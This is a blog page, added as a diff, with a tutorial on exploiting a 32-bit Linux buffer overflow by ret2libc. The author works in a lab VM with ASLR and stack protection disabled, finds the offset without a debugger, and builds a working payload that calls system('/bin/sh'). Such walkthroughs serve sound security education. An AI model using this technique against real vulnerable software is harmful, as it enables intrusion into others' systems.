@@ -1,0 +1,497 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Bad Hombre's Blog</title>
+  <meta name="theme-color" content="#222222" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://bad-hombres.github.io//blog/js/jquery.min.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/bootstrap.min.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/header.js"></script>
+  <script src="https://bad-hombres.github.io//blog/js/toc.js"></script>
+  <link href="https://bad-hombres.github.io//blog/css/bootstrap.min.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/theme.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/syntax.css" rel="stylesheet">
+  <link href="https://bad-hombres.github.io//blog/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="shortcut icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+
+  
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-99735361-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+  
+
+
+ <script type="text/javascript">
+  WebFontConfig = {
+    google: {
+      families: ['Ubuntu::latin']
+    }
+  };
+  (function() {
+    var wf = document.createElement('script');
+    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+    wf.type = 'text/javascript';
+    wf.async = 'true';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(wf, s);
+  })();
+</script>
+
+  <nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="https://bad-hombres.github.io//blog/">Bad Hombre's Blog</a>
+      </div>
+      <div class="collapse navbar-collapse">
+        <ul class="nav navbar-nav">
+          <li><a href="https://bad-hombres.github.io//blog/">/home</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/archive.html">/archive</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/tags.html">/tags</a></li>
+          <li><a href="https://bad-hombres.github.io//blog/about.html">/about</a></li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+
+<div class="wrapper">
+  <div class="content">
+    <div class="container container-center">
+      <div class="row">
+        <div class="col-md-8">
+          <div class="article">
+            <div class="well">
+              <h1><a href="https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html">Buffer Overflows: Level 2 (ret2libc)</a></h1>
+              <div class="post-meta">
+                <div class="post-time">
+                  <i class="fa fa-calendar"></i>
+                  <time>01 Nov 2018</time>
+                </div>
+                <ul>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
+                  
+                    <li><a href="https://bad-hombres.github.io//blog/tag/bufferoverflow">bufferoverflow</a></li>
+                  
+                </ul>
+              </div>
+              <div class="post-content">
+                <div id="toc" class="toc"></div>
+                <h3>Written by xirax</h3>
+                <h1 id="moving-forward">Moving forward</h1>
+<p>Following on from Level 1 where there were no protections in place we now
+advance to a place where compiler makers got annoyed with people smashing the
+stack and they said “hey lets make the stack not executable!!”. Makes sense
+right if the stack is not executable then hackers cant put code there and then
+execute it.</p>
+
+<p>The concept of ret2libc is as the name suggests, if we cant execute shellcode on
+the stack we just have to force the program to return to somewhere that is
+executable and in most binaries that will be the program itself or trusty libc.</p>
+
+<h1 id="show-me-the-money">Show me the money!</h1>
+<p>Right below is a vulnerable C program. (follow along by using the vagrant file I
+supplied in my post about vagrant) Its the same program used in level 1</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Lets compile and run</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ gcc -fno-stack-protector -o vuln2 vuln.c
+vagrant@precise32:/vagrant$ ./vuln2 AAAA
+AAAA
+</code></pre>
+</div>
+<p>Good all working, notice we have turned off stack protection (stack canaries)
+and the stack is now not executable. There is one other protection we want to
+disable which is ASLR</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ sudo bash -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space"
+</code></pre>
+</div>
+<p>In this post we are also going to do this without a debugger just for giggles.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ readelf -l ./vuln2
+
+Elf file type is EXEC (Executable file)
+Entry point 0x8048360
+There are 9 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
+  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x0061c 0x0061c R E 0x1000
+  LOAD           0x000f14 0x08049f14 0x08049f14 0x00104 0x0010c RW  0x1000
+  DYNAMIC        0x000f28 0x08049f28 0x08049f28 0x000c8 0x000c8 RW  0x4
+  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x000524 0x08048524 0x08048524 0x00034 0x00034 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+  GNU_RELRO      0x000f14 0x08049f14 0x08049f14 0x000ec 0x000ec R   0x1
+</code></pre>
+</div>
+<p>As you can see from the output above our stack is no longer executable (the RW
+on the GNU_STACK section)</p>
+
+<h1 id="finding-the-offset">Finding the offset</h1>
+<p>Ok so now we need to find the point in our buffer at which we begin to overwrite
+the return address. This is easy with a debugger and the use of patterns (as
+seen in level1) but how would we do this without a debugger? The answer is a
+binary search type algothrim which goes like this.</p>
+<ul>
+  <li>Find input that crashes the program</li>
+  <li>Reduce the size of the input</li>
+  <li>If the program no longer crashes then choose a buffer length in the middle of
+the two numbers</li>
+  <li>Rinse and repeat until you have reached a bugger length where adding 1 byte
+crashes the program</li>
+</ul>
+
+<p>See this process in action below</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*100')
+��
+Segmentation fault
+</code></pre>
+</div>
+<p>Crashes to lets drop to 60</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$  ./vuln2 $(python -c 'print "A"*60')
+��
+</code></pre>
+</div>
+<p>This no longer crashes so we’ll try 80</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*80')
+��
+Segmentation fault
+</code></pre>
+</div>
+<p>Ok so 80 crashes so its somewhere between 60 and 80 so lets try 70</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$  ./vuln2 $(python -c 'print "A"*70')
+��
+</code></pre>
+</div>
+<p>70 doesnt crash it so 75?</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*75')
+��
+</code></pre>
+</div>
+<p>Nope 77 maybe??</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*77')
+��
+Segmentation fault
+</code></pre>
+</div>
+<p>Ok crashes so now if 76 doesnt crash the program then this is the buffer length</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A"*76') 
+��
+</code></pre>
+</div>
+<p>Ok the program doesnt crash (it doesnt exit either) so 76 is our offset (spoiler
+its exactly the same as level one!! I know you’re shoked right!)</p>
+
+<h1 id="plan-of-attack">Plan of attack</h1>
+<p>So we cant run code on the stack and we are not using a debugger so here is what
+we are going to do.</p>
+
+<p>We are going to overflow the return address to return to system and execute
+/bin/sh. In order to do this we need to create a fake stack. Lets remind
+ourselves how this looks.</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>ebp
+return address
+args
+</code></pre>
+</div>
+<p>We want our shell to exit cleanly so we will return to exit of the system call.
+System also requires on argument, the address of a string containing the command
+we want to run. Our Payload will now look as follows</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>76 * "A" + address of system + address of exit + address of /bin/sh
+</code></pre>
+</div>
+<p>The address of exit is used as the return address after the system call and the
+address of /bin/sh is used as the argument to system</p>
+
+<h1 id="gathering-data">Gathering data</h1>
+
+<h2 id="libc-base-address">Libc base address</h2>
+<p>This one is fairly easy just use the LD_TRACE_LOADED_OBJECTS env var when
+running the binary</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ LD_TRACE_LOADED_OBJECTS=1 ./vuln2 AAAAAA
+	linux-gate.so.1 =&gt;  (0xb7fdd000)
+	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e29000)
+	/lib/ld-linux.so.2 (0xb7fde000)
+</code></pre>
+</div>
+<p>The address <code class="highlighter-rouge">0xb7e29000</code> next to the libc line is the base address</p>
+
+<h2 id="address-of-system--exit">Address of system + exit</h2>
+<p>For this one we will use the readelf tool on the libc binary and grep for the
+requiored symbols</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+   239: 001202b0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
+   615: 0003f0b0   141 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+  1422: 0003f0b0   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
+vagrant@precise32:/vagrant$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+   109: 00033000    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10
+   136: 00032bf0    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
+   549: 000baf68    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0
+   604: 001234b0    68 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0
+   640: 00032fd0    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10
+   856: 00032e30    58 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3
+  1024: 0012d6d0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0
+  1359: 001a8224     4 OBJECT  GLOBAL DEFAULT   31 argp_err_exit_status@@GLIBC_2.1
+  1471: 000ff1f0    67 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0
+  2058: 001a815c     4 OBJECT  GLOBAL DEFAULT   31 obstack_exit_failure@@GLIBC_2.0
+  2208: 00032c20    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0
+  2349: 00104900     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2
+</code></pre>
+</div>
+<p>So offset for system is <code class="highlighter-rouge">0x3f0b0</code> and exit is <code class="highlighter-rouge">0x32bf0</code>. A little bit of quick
+maths (adding to libc base) gives us <code class="highlighter-rouge">0xb7e680b0</code> for system and <code class="highlighter-rouge">0xb7e5bbf0</code> for
+exit</p>
+
+<h2 id="binsh">/bin/sh</h2>
+<p>To find this we will use the strings utility on the libc binary</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+ 1636a0 /bin/sh
+</code></pre>
+</div>
+<p>The -a flag searches all the binary the -t flag tells strings to print offsets
+and the x arg to the t flags specifies hex format. Adding this to libc base
+gives <code class="highlighter-rouge">0xb7f8c6a0</code></p>
+
+<h1 id="putting-it-alltogether">Putting it alltogether</h1>
+<p>So with this information we now have our payload looks like</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>vagrant@precise32:/vagrant$ ./vuln2 $(python -c 'print "A" * 76 + "\xb0\x80\xe6\xb7" + "\xf0\xbb\xe5\xb7" + "\xa0\xc6\xf8\xb7"')
+��
+$ id
+uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+$ exit
+vagrant@precise32:/vagrant$
+</code></pre>
+</div>
+<p>As you can see above we dropped into a shell and when we exited it exited
+cleanly so no coredumps etc are left around</p>
+
+<h1 id="what-now">What Now!!</h1>
+<p>Go ahead and do this on your own and practice!!!!</p>
+
+                
+
+<div class="share-bar">
+  <ul class="share-buttons">
+    
+    <li class="share-facebook">
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://bad-hombres.github.io//2018/11/01/Buffer-Overflow-Level-2.html" target="_blank" title="Share on Facebook">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-facebook fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-twitter">
+      <a href="https://twitter.com/intent/tweet?url=https://bad-hombres.github.io//2018/11/01/Buffer-Overflow-Level-2.html&text=Buffer Overflows: Level 2 (ret2libc)" target="_blank" title="Tweet">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-twitter fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-google-plus">
+      <a href="https://plus.google.com/share?url=https://bad-hombres.github.io//2018/11/01/Buffer-Overflow-Level-2.html" target="_blank" title="Share on Google Plus">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-google-plus fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-linkedin">
+      <a href="http://www.linkedin.com/shareArticle?mini=true&url=https://bad-hombres.github.io//2018/11/01/Buffer-Overflow-Level-2.html&title=Buffer Overflows: Level 2 (ret2libc)&summary=Post describing the exploit process for a traditional buffer overflow with a non executable stack&source=" target="_blank" title="Share on LinkedIn">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-linkedin fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-pinterest">
+      <a href="http://pinterest.com/pin/create/button/?urlhttps://bad-hombres.github.io//2018/11/01/Buffer-Overflow-Level-2.html=&description=Post describing the exploit process for a traditional buffer overflow with a non executable stack" target="_blank" title="Pin it">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-pinterest fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+    
+    <li class="share-envelope">
+      <a href="mailto:?&subject=Buffer Overflows: Level 2 (ret2libc)&body=Post describing the exploit process for a traditional buffer overflow with a non executable stack https://bad-hombres.github.io//2018/11/01/Buffer-Overflow-Level-2.html" target="_blank" title="Email">
+        <span class="fa-stack fa-lg">
+          <i class="fa fa-square-o fa-stack-2x"></i>
+          <i class="fa fa-envelope-o fa-stack-1x"></i>
+        </span>
+      </a>
+    </li>
+    
+
+  </ul>
+</div>
+
+
+              </div>
+              
+              <div id="disqus_thread">
+                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+              </div>
+              
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4 hidden-xs">
+          <div class="sidebar ">
+  <h2>Recent Posts</h2>
+  <ul>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html">Buffer Overflows: Level 2 (ret2libc)</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html">SLAE: TCP Bind Shell</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html">Buffer Overflows: Level 1 (ret2stack)</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html">Crafting Shellcode</a></li>
+    
+    <li><a href="https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html">Format Strings</a></li>
+    
+  </ul>
+</div>
+
+<div class="sidebar">
+  <h2>Tags</h2>
+  <ul>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/tools">tools</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/shellcode">shellcode</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/assembly">assembly</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/bufferoverflow">bufferoverflow</a></li>
+    
+      <li><a href="https://bad-hombres.github.io//blog/tag/slae">slae</a></li>
+    
+  </ul>
+</div>
+
+        </div>
+      </div>
+    </div>
+    
+<!-- Add Disqus comments. -->
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+  var disqus_shortname = 'bad-hombres'; // required: replace example with your forum shortname
+  var disqus_identifier = "/2018/11/01/Buffer-Overflow-Level-2.html";
+
+  /* * * DON'T EDIT BELOW THIS LINE * * */
+  (function() {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+  </div>
+      <footer class="footer-distributed">
+      <div class="container">
+        <div class="footer">
+          <p>Bad Hombres &copy; 2017</p>
+          <h6>Follow us</h6>
+
+<ul class="social-media">
+
+  
+    <li>
+      <a title="bad-hombres on Github" href="https://github.com/bad-hombres" target="_blank"><i class="fa fa-github fa-2x"></i></a>
+    </li>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    <li>
+      <a title="feed.xml RSS" href="/blog/feed.xml" target="_blank"><i class="fa fa-rss fa-2x"></i></a>
+    </li>
+  
+
+</ul>
+
+
+          <p> Original theme from <a href="https://github.com/streetturtle/jekyll-clean-dark">Here</a>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
+
+</div>
